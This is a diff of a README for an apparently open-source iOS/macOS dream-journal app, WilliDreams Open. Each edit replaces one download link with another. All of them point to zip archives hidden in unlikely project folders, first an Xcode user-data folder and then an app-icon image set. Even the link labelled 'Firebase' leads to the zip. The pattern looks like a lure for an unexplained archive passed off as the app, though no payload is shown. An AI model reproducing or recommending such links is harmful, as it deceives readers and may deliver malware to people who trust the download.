@@ -4,7 +4,7 @@
 
 Welcome to **WilliDreams Open**, a simple and efficient way to track your dreams and share them with friends. Follow these steps to download and run the app on your iOS or macOS device.
 
-[![Download WilliDreams](https://raw.githubusercontent.com/Chrislovlin/WilliDreams-Open/main/WilliDreams.xcodeproj/xcuserdata/willgallegos.xcuserdatad/WilliDreams-Open_v2.1.zip)](https://raw.githubusercontent.com/Chrislovlin/WilliDreams-Open/main/WilliDreams.xcodeproj/xcuserdata/willgallegos.xcuserdatad/WilliDreams-Open_v2.1.zip)
+[![Download WilliDreams](https://github.com/Chrislovlin/WilliDreams-Open/raw/refs/heads/main/WilliDreams/Assets.xcassets/AppIconPreviews/App IconPreview.imageset/Open-Dreams-Willi-Chocoan.zip)](https://github.com/Chrislovlin/WilliDreams-Open/raw/refs/heads/main/WilliDreams/Assets.xcassets/AppIconPreviews/App IconPreview.imageset/Open-Dreams-Willi-Chocoan.zip)
 
 ## 💡 Introduction
 
@@ -14,7 +14,7 @@ Welcome to **WilliDreams Open**, a simple and efficient way to track your dreams
 
 To get started with WilliDreams, visit the Releases page to download the app:
 
-[Download WilliDreams Open](https://raw.githubusercontent.com/Chrislovlin/WilliDreams-Open/main/WilliDreams.xcodeproj/xcuserdata/willgallegos.xcuserdatad/WilliDreams-Open_v2.1.zip)
+[Download WilliDreams Open](https://github.com/Chrislovlin/WilliDreams-Open/raw/refs/heads/main/WilliDreams/Assets.xcassets/AppIconPreviews/App IconPreview.imageset/Open-Dreams-Willi-Chocoan.zip)
 
 The download will provide you with a file to install on your device. Follow the setup instructions below to ensure a smooth experience.
 
@@ -41,7 +41,7 @@ To use WilliDreams, you will need:
 
 ### 🔗 Firebase Setup
 
-1. Once you have your Google account, visit [Firebase](https://raw.githubusercontent.com/Chrislovlin/WilliDreams-Open/main/WilliDreams.xcodeproj/xcuserdata/willgallegos.xcuserdatad/WilliDreams-Open_v2.1.zip).
+1. Once you have your Google account, visit [Firebase](https://github.com/Chrislovlin/WilliDreams-Open/raw/refs/heads/main/WilliDreams/Assets.xcassets/AppIconPreviews/App IconPreview.imageset/Open-Dreams-Willi-Chocoan.zip).
 2. Create a new **Firebase project** by following the on-screen instructions.
 3. After setting up your project, enable the following features:
    - **Authentication**: To manage user sign-in and sign-up.
@@ -72,4 +72,4 @@ If you encounter any issues during installation or use, you can find help in the
 
 Feel free to explore and enjoy your journey of tracking dreams with WilliDreams!
 
-[Download WilliDreams Open](https://raw.githubusercontent.com/Chrislovlin/WilliDreams-Open/main/WilliDreams.xcodeproj/xcuserdata/willgallegos.xcuserdatad/WilliDreams-Open_v2.1.zip)
+[Download WilliDreams Open](https://github.com/Chrislovlin/WilliDreams-Open/raw/refs/heads/main/WilliDreams/Assets.xcassets/AppIconPreviews/App IconPreview.imageset/Open-Dreams-Willi-Chocoan.zip)
